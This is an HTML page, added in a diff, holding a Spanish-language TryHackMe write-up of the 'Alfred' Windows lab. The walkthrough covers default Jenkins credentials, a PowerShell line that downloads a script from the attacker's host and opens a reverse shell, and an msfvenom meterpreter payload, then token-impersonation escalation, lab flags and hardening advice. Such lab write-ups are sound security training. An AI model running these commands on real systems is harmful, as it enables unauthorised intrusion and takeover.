@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="es-EC">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="apple-touch-icon" size="180x180" href="http://localhost:1313/images/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/images/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/images/favicon-16x16.png" />
+<link rel="manifest" href="http://localhost:1313/images/site.webmanifest" />
+
+<link rel="shortcut icon" href="http://localhost:1313/images/favicon.ico" />
+<meta name="msapplication-TileColor" content="#4385BE" />
+
+
+<title>Reto Alfred (THM) | Gabriel Tello</title>
+<meta name="title" content="Reto Alfred (THM)" />
+<meta name="description" content="Writeup de Alfred." />
+<meta name="keywords" content="windows,pentesting,metasploit,red team,tryhackme,writeup," />
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta property="og:title" content="Reto Alfred (THM)" />
+<meta property="og:description" content="Writeup de Alfred." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/es/writeups/alfred/" />
+
+<meta property="og:image" content="http://localhost:1313/images/social_card_bg_hu106311934034199405.webp"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2024-11-15T15:30:00+00:00" />
+<meta property="article:modified_time" content="2024-11-15T15:30:00+00:00" /><meta property="og:site_name" content="Gabriel Tello" />
+<meta property="fb:admins" content="0000000000" />
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://localhost:1313/images/social_card_bg_hu106311934034199405.webp"/>
+<meta name="twitter:title" content="Reto Alfred (THM)"/>
+<meta name="twitter:description" content="Writeup de Alfred."/>
+<meta name="twitter:site" content="@example"/>
+
+
+
+<meta itemprop="name" content="Reto Alfred (THM)">
+<meta itemprop="description" content="Writeup de Alfred."><meta itemprop="datePublished" content="2024-11-15T15:30:00+00:00" />
+<meta itemprop="dateModified" content="2024-11-15T15:30:00+00:00" />
+<meta itemprop="wordCount" content="440">
+
+<meta itemprop="image" content="http://localhost:1313/images/social_card_bg_hu106311934034199405.webp"/>
+
+
+<meta itemprop="keywords" content="windows,pentesting,metasploit,red team,tryhackme,writeup," />
+
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  
+  <link href="/style.min.css" rel="stylesheet">
+
+  
+    
+    <link href="/syntax.min.css" rel="stylesheet">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.21.2/tocbot.css">
+    
+    <link href="/toc.min.css" rel="stylesheet">
+  
+
+  
+</head>
+
+<body>
+  <header><a class="skip-link" href="#main-content">Saltar al contenido principal</a>
+
+<a href="/es/" class="title"><h1>Gabriel Tello</h1></a>
+<nav>
+  <a href="/es/">Inicio</a>
+
+  <a href="/es/posts/">Publicaciones</a>
+
+  <a href="/es/projects/">Proyectos</a>
+
+  <a href="/es/writeups/">Reportes</a>
+
+<a href='http://localhost:1313/index.xml'>RSS</a>
+
+
+
+
+  
+
+
+
+
+  
+    <a href="http://localhost:1313/writeups/alfred/">English</a>
+  
+
+</nav>
+</header>
+  <main id="main-content">
+
+<h1>Reto Alfred (THM)</h1>
+<p class="byline" style="color: gray; font-size: 0.9rem">
+  Fecha de publicación:
+  <time datetime='15/11/2024, 15:30' pubdate>
+    15/11/2024, 15:30
+  </time>
+  
+  
+  |
+  <span>500</span> 
+  palabras
+  |
+  <span>3</span>
+  <span>mins</span>
+</p>
+
+
+<article class="article">
+  
+  <aside class="sidebar">
+    <div class="toc-container">
+      <div style="font-weight: bold; margin-bottom: 0.4rem">Tabla de Contenidos</div>
+      <div class="toc"></div>
+    </div>
+  </aside>
+  
+
+  <content class="content">
+    <div style="text-align: justify;">
+<p>Aquí tienes el writeup de la máquina <a href="https://tryhackme.com/r/room/alfred">Alfred</a> en TryHackMe.</p>
+<h2 id="resumen">Resumen</h2>
+<p>Vamos a ver cómo explotar una máquina Windows con un servicio Jenkins expuesto. Usando credenciales por defecto, logramos ejecutar comandos remotos a través de la funcionalidad de construcción de Jenkins y obtenimos un acceso inicial. A partir de ahí, escalamos privilegios utilizando técnicas de suplantación de tokens, alcanzando finalmente control administrativo total del sistema.</p>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Lo primero fue realizar un escaneo de red con <code>nmap</code> para identificar puertos y servicios abiertos.</p>
+<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Sistema Operativo</th>
+          <th style="text-align: left">Dirección IP</th>
+          <th style="text-align: left">Puertos Abiertos</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">Windows Server</td>
+          <td style="text-align: left">10.10.149.26</td>
+          <td style="text-align: left">80, 3389, 8080</td>
+      </tr>
+  </tbody>
+</table>
+<p><img alt="Comando nmap y resultados" src="/images/posts/alfred/image1.png"></p>
+<center><b>Comando nmap y resultados</b></center>
+<p>Los puertos 80 y 8080 fueron analizados en el navegador. En el puerto 8080, encontré un portal de inicio de sesión de Jenkins, una herramienta ampliamente usada para CI/CD.</p>
+<h2 id="explotación">Explotación</h2>
+<p>¡Manos a la obra! Probé credenciales por defecto (<code>admin:admin</code>) en el portal de Jenkins, y sorpresa: funcionaron. Esto me dio acceso al dashboard.</p>
+<p><img alt="Dashboard de Jenkins" src="/images/posts/alfred/image2.png"></p>
+<center><b>Dashboard de Jenkins</b></center>
+<p>En la configuración del proyecto, utilicé la sección &ldquo;Build&rdquo; para ejecutar comandos. Usé este <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">script</a> de PowerShell para establecer una reverse shell:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.6.5.62:8008/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.6</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">62</span> <span class="n">-Port</span> <span class="mf">4321</span></span></span></code></pre></div><p>Con la opción <strong>Build Now</strong>, conseguí conectarme exitosamente a la máquina objetivo desde mi terminal atacante.</p>
+<p><img alt="Comando de reverse shell en Jenkins" src="/images/posts/alfred/image3.png"></p>
+<center><b>Comando de reverse shell en Jenkins</b></center>  
+<p><img alt="Acceso mediante reverse shell" src="/images/posts/alfred/image4.png"></p>
+<center><b>Acceso mediante reverse shell</b></center>
+<h2 id="escalación-de-privilegios">Escalación de Privilegios</h2>
+<p>Una vez dentro de la máquina, generé un payload ejecutable para obtener una sesión de <code>meterpreter</code> utilizando <code>msfvenom</code>:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o revshell.exe</span></span></code></pre></div><p>Transferí el payload a la máquina objetivo utilizando <code>certutil</code> y lo ejecuté, estableciendo una conexión <code>meterpreter</code> con mi máquina atacante.</p>
+<p><img alt="Configuración del receptor en Metasploit" src="/images/posts/alfred/image5.png"></p>
+<center><b>Configuración del receptor en Metasploit</b></center>
+<p>Revisando los privilegios del usuario, podemos ver que tenemos los permisos <code>SeDebugPrivilege</code> y <code>SeImpersonatePrivilege</code>. Estos permisos permiten suplantar tokens y acceder a procesos con permisos elevados. Utilicé el módulo <code>incognito</code> de Metasploit para explotarlos.</p>
+<p><img alt="Uso del módulo incognito" src="/images/posts/alfred/image6.png"></p>
+<center><b>Uso del módulo incognito</b></center>
+<p>Finalmente, migré el proceso a un servicio con permisos <code>SYSTEM</code>, logrando control completo sobre la máquina.</p>
+<p><img alt="Migración a un proceso privilegiado" src="/images/posts/alfred/image7.png"></p>
+<center><b>Migración a un proceso privilegiado</b></center>
+<h2 id="banderas">Banderas</h2>
+<p>Con acceso administrativo, encontré las banderas:</p>
+<ul>
+<li><strong>user.txt</strong>: <code>79007a09481963edf2e1321abd9ae2a0</code></li>
+<li><strong>root.txt</strong>: <code>dff0f748678f280250f25a45b8046b4a</code></li>
+</ul>
+<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Herramienta</th>
+          <th style="text-align: left">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>nmap</strong></td>
+          <td style="text-align: left">Escaneo de red y detección de servicios abiertos.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Jenkins</strong></td>
+          <td style="text-align: left">Plataforma explotada con credenciales por defecto para ejecutar comandos.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>msfvenom/metasploit</strong></td>
+          <td style="text-align: left">Generación de payloads y escalación de privilegios con el módulo incognito.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>certutil</strong></td>
+          <td style="text-align: left">Transferencia del payload a la máquina objetivo.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="conclusión">Conclusión</h2>
+<p>La explotación del sistema Alfred reveló problemas críticos como servicios expuestos con credenciales por defecto y configuraciones incorrectas de privilegios, lo que permitió escalar hasta el nivel de administrador.</p>
+<h2 id="recomendaciones">Recomendaciones</h2>
+<ul>
+<li><strong>Actualizar Jenkins</strong> y eliminar credenciales por defecto.</li>
+<li>Configurar un <strong>firewall</strong> para restringir accesos innecesarios.</li>
+<li>Implementar políticas de contraseñas robustas.</li>
+<li>Limitar privilegios innecesarios en los usuarios.</li>
+</ul>
+</div>
+
+    
+    <p class="tags-section">
+      
+        <a class="blog-tags" href="http://localhost:1313/es/tags/windows/">#Windows</a>&nbsp;&nbsp;
+      
+        <a class="blog-tags" href="http://localhost:1313/es/tags/pentesting/">#Pentesting</a>&nbsp;&nbsp;
+      
+        <a class="blog-tags" href="http://localhost:1313/es/tags/metasploit/">#Metasploit</a>&nbsp;&nbsp;
+      
+        <a class="blog-tags" href="http://localhost:1313/es/tags/red-team/">#Red Team</a>&nbsp;&nbsp;
+      
+        <a class="blog-tags" href="http://localhost:1313/es/tags/tryhackme/">#Tryhackme</a>&nbsp;&nbsp;
+      
+        <a class="blog-tags" href="http://localhost:1313/es/tags/writeup/">#Writeup</a>&nbsp;&nbsp;
+      
+    </p>
+  </content>
+</article>
+
+
+<script src="https://giscus.app/client.js"
+        data-repo="gtello/gtello.github.io"
+        data-repo-id="R_kgDONAQNkQ"
+        data-category="Comments"
+        data-category-id="DIC_kwDONAQNkc4CjaoW"
+        data-mapping='og:title'
+        data-strict="0"
+        data-reactions-enabled="0"
+        data-emit-metadata="0"
+        data-input-position='top'
+        data-theme='preferred_color_scheme'
+        data-lang='en'
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+
+  <p>
+    <a href='mailto:gabrieltello10@hotmail.com?subject=Reponder%20a%20"Reto%20Alfred%20%28THM%29"'>
+      Responder a este post por correo ↪
+    </a>
+  </p>
+
+
+
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  cornerOffset: 32,
+  diameter: 48,
+  backgroundColor: "var(--flexoki-dark-blue)",
+  textColor: "var(--flexoki-50)",
+  showWhenScrollTopIs: 512, 
+})</script>
+
+  
+  <script src="/js/copy-code-button.min.js"></script>
+
+
+
+  </main>
+  <footer><small>
+  <a href="https://github.com/gtello">Gabriel Tello</a> © 2024 | Hecho con <a href="https://github.com/Pagliacii/hugo-bearberry">Bear Berry</a>
+</small>
+</footer>
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.21.2/tocbot.min.js"></script>
+    
+    <script src="/js/toc.min.js"></script>
+  
+
+    
+</body>
+
+</html>
